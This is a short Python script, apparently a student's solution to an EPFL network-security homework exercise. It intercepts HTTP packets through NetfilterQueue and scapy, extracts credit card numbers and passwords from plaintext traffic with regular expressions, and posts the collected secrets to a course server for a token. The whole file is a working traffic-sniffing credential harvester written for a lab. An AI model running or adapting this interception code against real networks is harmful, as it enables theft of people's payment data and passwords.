from netfilterqueue import NetfilterQueue
from scapy.all import *

import requests
import json
import re

secrets = set()

def request_token():
	data = {
		"student_email": "pau.argelaguet@epfl.ch",
		"secrets": list(secrets)
	}
	r = requests.post("http://com402.epfl.ch/hw1/ex4/sensitive", json=data)
	print(r.text)

def process(pkt):
	ip = IP(pkt.get_payload())
	if ip[TCP].dport == 80:
		try:
			http = ip[Raw].load.decode()
			lines = http.split("\n")
			if "cc --- " in lines[-1]:
				data = lines[-1].split("cc --- ")[1]
				cc = data.split()[0]
				if re.search(r"\d{4}(\.|\/)\d{4}(\.|\/)\d{4}(\.|\/)\d{4}", cc):
					if cc not in secrets:
						secrets.add(cc)
			elif "pwd --- " in lines[-1]:
				data = lines[-1].split("pwd --- ")[1]
				pwd = data.split()[0]
				if 8 <= len(pwd) <= 30 and not re.search('[a-z]', pwd):
					if pwd not in secrets:
						secrets.add(pwd)
					print(list(secrets))
			elif len(secrets) > 4:
				request_token()
		except IndexError:
			# No application layer
			pass
	pkt.accept()


def main():
	nfqueue = NetfilterQueue()
	nfqueue.bind(0, process, 100)
	try:
		nfqueue.run()
	except KeyboardInterrupt:
		print('')


if __name__ == '__main__':
	main()
